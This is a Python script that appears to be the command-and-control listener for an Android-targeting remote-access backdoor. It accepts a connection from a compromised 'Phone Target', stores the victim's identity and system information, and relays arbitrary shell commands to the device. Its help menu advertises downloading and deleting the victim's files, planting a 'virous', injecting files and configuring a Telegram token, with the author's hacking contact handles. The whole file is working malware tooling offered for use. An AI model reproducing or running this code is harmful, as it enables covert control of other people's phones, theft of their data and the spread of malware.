import os
import sys
import time
import socket
R='\33[1;31m'
G='\33[1;32m'
gr='\033[1;30m'
O='\33[1;33m'
B='\33[1;34m'
help=("""\33[0m
   +-----------------------------------------+
   ¦               command help              ¦
   -------------------------------------------
   ¦ cd /sdcard # open sdcard Phone Target   ¦
   ¦ ls #                                    ¦
   ¦ pwd # path in Phone Target              ¦ 
   ¦ chat # send message                     ¦
   -------------------------------------------
   ¦ download from Phone Target              ¦
   ¦ mv and name files and path              ¦
   -------------------------------------------
   ¦ remove file in Phone Target             ¦
   ¦ remove and name file                    ¦
   -------------------------------------------
   ¦ virous in Phone Target                  ¦
   ¦ virous                                  ¦
   -------------------------------------------
   ¦ injected file in Phone Target           ¦
   ¦ set host # Token Telegram               ¦  
   ¦ set port # Id telegrma                  ¦
   -------------------------------------------
   ¦ sysinfo # target inof                   ¦
   -------------------------------------------
   ¦ # Please Report This bug To My Facebook ¦ 
   ¦ # https://www.facebook.com/isohacking   ¦
   ¦ # Telegram : @i_4iS_exe                 ¦
   +-----------------------------------------+
""")
try:
	from helper import __backhelp__
except:
	print('[!] Data Error')
	sys.exit()
W='\33[0m'
R='\33[1;31m'
G='\33[1;32m'
gr='\033[1;30m'
def main():
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	xx=socket.gethostname()
	print(f"{W}[{R}*{W}]{R} starting server{G} $1 {W}")
	s.bind(('$1',$2))
	s.listen(4)
	c,addr=s.accept()
	print(f'{W}[{R}*{W}]{R} command shell')
	xx=c.recv(4096)
	xx=xx.decode('utf-8')
	cc=open('id_target.txt','w')
	cc.write(xx+'\n')
	cc.close()
	#os.system('mv id_target.txt $HOME')
	#print('[*] Target open backdoor\n[*] and sive Ip in file > Target/id_target.txt ')
	fo=open('systeminfo.txt','w')
	xx=c.recv(4096)
	xx=xx.decode('utf-8')
	fo.write(xx+'\n')
	fo.close()
	while True:
		cmd=input(R+f'dump:$1:#/>{W} ')
		cmd=cmd.strip()
		if cmd == 'help':
			print(help)
			continue
		if cmd == '' or cmd == " ":
			continue
		if cmd == 'sysinfo':
			os.system('cat id_target.txt')
			time.sleep(1)
			os.system('cat systeminfo.txt')
			continue
		if cmd == 'exit':
			c.send(b'exit')
			break
			sys.exit()
			s.close()
			break
		else:
			cmd=cmd.encode('utf-8')
			c.sendall(cmd)
			data=c.recv(4096)
			data=data.decode('utf-8')
			print(data)

try:
	main()
except:
	print('[!] Errro')